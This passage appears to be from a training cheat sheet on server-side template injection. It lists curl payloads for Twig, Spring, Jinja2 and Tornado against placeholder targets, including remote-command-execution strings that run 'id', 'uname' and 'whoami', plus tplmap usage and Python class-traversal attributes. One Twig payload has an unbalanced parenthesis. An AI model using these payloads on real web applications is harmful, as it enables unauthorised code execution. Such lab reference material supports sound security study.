| `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}` | Twig RCE payload                                                         |

# SSTI Exploitation Example 2

## Command	Description

| Command                                                                                      | Description                                                             |
|----------------------------------------------------------------------------------------------|-------------------------------------------------------------------------|
| `curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam`                        | Interacting with the remote target (Spring payload)                     |
| `curl -X POST -d 'email={{_self.env.display("TEST"}}' http://<TARGET IP>:<PORT>/jointheteam`  | Interacting with the remote target (Twig payload)                       |
| `curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam`            | Interacting with the remote target (Jinja2 basic injection)             |
| `curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam` | Interacting with the remote target (Jinja2 dump all classes payload)    |
| `curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam` | Interacting with the remote target (Tornado payload)            |
| `./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah`                        | Automating the exploitation process with tplmap                         |

# SSTI Exploitation Example 3

## Command	Description

| Command                                                                                   | Description                                                             |
|-------------------------------------------------------------------------------------------|-------------------------------------------------------------------------|
| `curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"`                              | Interacting with the remote target (Confirming Jinja2 backend)          |
| `./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'`                                  | Automating the templating engine identification process with tplmap     |
| `python3`                                                                                 | Starting the python3 interpreter                                        |

### Methods	Description

| Method           | Description                                                               |
|------------------|---------------------------------------------------------------------------|
| `__class__`      | Returns the object (class) to which the type belongs                      |
| `__mro__`        | Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples |
| `__subclasses__` | Each new class retains references to subclasses, and this method returns a list of references that are still available in the class |
| `__builtins__`   | Returns the builtin methods included in a function                        |
| `__globals__`    | A reference to a dictionary that contains global variables for a function |
| `__base__`       | Returns the base class inherited by the object                            |
| `__init__`       | Class initialization method                                               |













